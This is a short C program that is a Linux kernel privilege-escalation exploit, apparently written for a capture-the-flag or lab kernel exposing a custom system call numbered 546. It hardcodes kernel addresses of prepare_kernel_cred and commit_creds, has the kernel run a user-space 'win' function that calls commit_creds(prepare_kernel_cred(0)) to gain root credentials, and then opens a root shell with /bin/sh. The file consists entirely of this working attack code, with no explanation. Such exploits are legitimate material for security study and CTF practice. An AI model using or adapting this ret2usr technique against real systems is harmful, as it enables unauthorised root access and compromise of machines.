#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

const unsigned long int SYS_suscall = 546;
void* (*prepare_kernel_cred)(int)  = 0xffffffff842749c0;
void (*commit_creds)(void *)  = 0xffffffff842745f0;

int win() {
    commit_creds(prepare_kernel_cred(0));
    return 1;
}


int main(void) {
    int ret = syscall(SYS_suscall, &win);
    printf("%d\n", ret);
    system("/bin/sh");
    return 0;
}
